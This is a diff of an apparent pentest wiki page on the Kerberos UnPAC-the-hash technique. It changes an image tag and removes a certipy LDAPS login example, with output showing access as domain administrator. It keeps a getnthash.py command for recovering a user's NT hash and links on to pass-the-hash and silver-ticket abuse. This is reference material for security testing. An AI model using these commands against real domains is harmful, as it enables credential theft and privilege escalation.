@@ -8,7 +8,7 @@ The NTLM keys will then be recoverable after a TGS-REQ through U2U which is a Se
 
 The following protocol diagram demonstrates how UnPAC-the-hash works. It allows attackers that know a user's private key, or attackers able to conduct a [Shadow Credentials](shadow-credentials.md) attacks, to recover the user's LM and NT hashes.
 
-![](../../../.gitbook/assets/UnPAC-the-hash.png)
+<figure><img src="../../../.gitbook/assets/assets_-MHRw3PMJtbDDjbxm5ub_-MlEghFLLIwtdckjt1uI_-MlFBTGo2yVTnvfF2qSS_UnPAC-the-hash.webp" alt=""><figcaption></figcaption></figure>
 
 ## Practice
 
@@ -30,24 +30,6 @@ getnthash.py -key 'AS-REP encryption key' 'FQDN_DOMAIN'/'TARGET_SAMNAME'
 ```
 
 The NT hash can be used for [pass-the-hash](../ntlm/pth.md), [silver ticket](forged-tickets/#silver-ticket), or [Kerberos delegations](delegations/) abuse.
-
-{% hint style="info" %}
-If you have this error:**`KDC_ERR_PADATA_TYPE_NOSUPP`**when requesting PKINIT, it may be an indication that your targeted KDCs do not have certificates with the necessary EKU (Extended Key Usages). \
-More specificly, If a KDC must support smart card logon, its certificate must have the `Smart Card Logon` EKU\
-\
-**You can use your certificate to logon on LDAPS via Schannel**
-{% endhint %}
-
-Authentication via Schannel is supported by [certipy-ad](https://github.com/ly4k/Certipy):
-
-```bash
-certipy auth -pfx administrator.pfx -username 'administrator' -domain 'contoso.local' -ldap-shell -ldap-scheme ldaps -dc-ip $DC_IP
-[*] Connecting to 'ldaps://10.10.10.10:636'
-[*] Authenticated to '10.10.10.10' as: u:CONTOSO.LOCAL\Administrator
-Type help for list of commands
-
-# help
-```
 {% endtab %}
 
 {% tab title="Windows" %}
